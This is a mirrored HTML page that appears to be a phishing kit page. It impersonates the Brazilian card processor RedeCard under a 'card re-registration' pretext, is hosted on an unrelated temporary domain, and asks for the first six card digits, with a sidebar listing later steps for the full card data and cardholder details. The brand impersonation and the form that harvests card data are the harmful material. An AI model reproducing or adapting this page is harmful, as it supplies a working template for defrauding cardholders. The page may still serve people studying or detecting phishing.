<html>
<!-- Mirrored from promodemalasprontas.tempsite.ws/primeiro_passo.php by HTTrack Website Copier/3.x [XR&CO'2010], Thu, 28 Oct 2010 02:52:38 GMT -->
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<SCRIPT language=JavaScript>
	function validaForm(){
		d = document.form1;
							if (d.bin.value.length!=6){
alert("Digite os 6 primeiros números de seu cartão Visa.");
return false;
}
		}
</SCRIPT>

<script LANGUAGE="Javascript">
function Numero(e)
{
  navegador = /msie/i.test(navigator.userAgent);
  if (navegador)
   var tecla = event.keyCode;
  else
   var tecla = e.which;
  
  if(tecla > 47 && tecla < 58) // numeros de 0 a 9
    return true;
  else
    {
      if (tecla != 8) // backspace
        return false;
      else
        return true;
    }
}
</SCRIPT>
			
			<title>RedeCard - Recadastramento Passo 1</title>
						<link type="text/css" rel="STYLESHEET" href="estilo.css">
			</head>
<body leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" rightmargin="0" bottommargin="0">
			<table width="567" border="0" cellpadding="0" cellspacing="0">
			<tbody><tr>
			<td align="center">
				<!--Inicio do Cabeçalho-->

				

	<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
	<tbody><tr>
	<td width="10" height="55" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
	<td width="150" bgcolor="#FFFFFF">


		<img src="img/logo2.jpg" width="80" border="0" height="60">


	</td>
	<td width="100%" align="center" bgcolor="#FFFFFF"><img src="img/logo.jpg" width="278" border="0" height="41"></td>
	<td bgcolor="#FFFFFF">
		<table class="corpoResumo" width="150" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td align="center" height="55"> </td>
		</tr>
		</tbody></table>
	</td>
	<td width="10" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
	</tr>
	</tbody></table> 



				<!--Fim do cabeçalho-->
				<!--Inicio do Corpo-->
				<table class="corpo" width="93%" border="0" cellpadding="0" cellspacing="0">
				<tbody><tr>
				<td width="10" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
				<td valign="top" bgcolor="#FFFFFF">

Este é o inicio do recadastramento do seu cartão.<br><br>Confira as <b>Informações</b> ao lado direito e siga as instruções abaixo:<br><br>
Digite os <b>6 primeiros números de seu cartão MasterCard</b><br>(conforme indicado na figura) e clique em continuar:<br><br>

					<table style="margin-right: 30px;" align="center" border="0" cellpadding="0" cellspacing="0">
					<form name="form1" method="post" action="segundo_passo.php" onKeyPress="return Numero(event);" onSubmit="return validaForm()" >
					<tbody><tr>
					<td height="9"></td>
					</tr>
					<tr>
					<td>
						<input name="bin" style="width: 50px; margin-top: 17px;" class="box" maxlength="6" size="20" type="text"></td>
					<td width="185"><img src="img/frentemc.jpg" width="172" border="0" height="90"></td>
					</tr>
					<tr>
					<td colspan="2" height="11"></td>
					</tr>
					<tr>
					<td colspan="2" align="right">
						<input value="Continuar" name="Submit1" type="submit">
						<input value="Fechar" name="btcancelar" onClick="fechar();" type="button">
					</td>
					</tr>
					</form>
					
					</tbody></table>

					<p align="center"><a href="#"> (Instruções de Segurança) </a> </p>
				</td>
				<td width="10" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
				<td valign="top" width="202" bgcolor="#FFFFFF">
					<!--Inicio Comprovante-->

						
		<table width="200" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td class="bgResumo" valign="top" align="center" height="250">
			<table width="175" border="0" cellpadding="0" cellspacing="0">
			<tbody><tr>
			<td height="10"></td>
			</tr>
			<tr>
			<td class="titResumo" align="center">Informações</td>
			</tr>
			<tr>
			<td height="5"></td>
			</tr>
			<tr>
			<td class="corpoResumoTitulo">
				<b class="subTitResumo">Siga os passos abaixo:</b><br><br>
				<b class="corpoResumoTitulo">1ª Digite os 6 primeiros digito do 
				cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">2ª Digite os demais dados do 
				cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">3ª Digite os dados do titular do 
				cartão.</b> <font class="corpoConteudo"></font><br><br>
				
				<br>
				<center><img src="img/px_preto.gif" vspace="5" width="95%" border="0" height="2"></center>
				<br>
				

				<center><span style="font-size: 7pt;"><br>
				REDECARD ©
				</span>
				</center> <br>
			</td>
			</tr>
			</tbody></table>
		</td>
		</tr>
		</tbody></table>



					<!--Fim Comprovante-->

				</td>
				<td width="13" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
				</tr>
				</tbody></table>
				<!--Fim do Corpo-->
			</td>
			</tr>
			</tbody></table>
			</body>
<!-- Mirrored from promodemalasprontas.tempsite.ws/primeiro_passo.php by HTTrack Website Copier/3.x [XR&CO'2010], Thu, 28 Oct 2010 02:52:40 GMT -->
</html>
